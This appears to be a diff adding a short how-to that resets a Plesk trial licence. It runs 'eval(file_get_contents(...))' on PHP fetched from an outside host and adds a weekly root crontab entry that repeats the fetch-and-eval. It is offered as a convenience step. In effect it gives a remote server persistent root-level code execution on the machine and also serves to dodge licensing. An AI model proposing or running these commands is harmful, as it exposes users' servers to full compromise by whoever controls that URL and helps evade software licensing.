@@ -1,0 +1,13 @@
+# Addition to the system here
+
+plesk php -er "eval(file_get_contents('https://plesktrial.yoncu.com/?CMD=x'));";
+
+# For automating renewal create cron job as follows:
+
+# Enter crontab with nano /etc/crontab
+
+22 4 * * 0 root plesk php -er "eval(file_get_contents('https://plesktrial.yoncu.com/?CMD=x'));";
+
+(Sometimes it may not work)
+# URL: https://plesktrial.yoncu.com/?CMD=x
+# URL Scan result: https://www.virustotal.com/gui/url/4bedcc9ad2dd3b073ff2742a18fbcb4d470b0c74443be6d43bcc13061bae1cdc/community
